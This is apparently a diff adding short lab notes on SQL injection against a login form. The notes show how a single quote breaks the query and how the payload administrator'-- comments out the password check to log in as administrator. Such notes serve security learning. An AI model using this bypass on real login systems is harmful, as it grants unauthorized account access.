@@ -1,0 +1,14 @@
+Sql Injection - Login Functionalty.
+
+End Goal : perform Sql Injection attack and log in as administrator user.
+
+Analysis :
+
+    SELECT FirstName FROM users where username= 'admin' and password= 'admin'
+
+    SELECT FirstName FROM users where username= ''' and password= 'admin'
+        when we put ' in username it closes the brackets and leave the other bracket ' with rest of query
+        leading to server error - the goal is to login with only username and ignore password.
+
+    SELECT FirstName FROM users where username= 'administrator'--' and password= 'admin'
+        means login with admin and ignore the rest by using -- comments
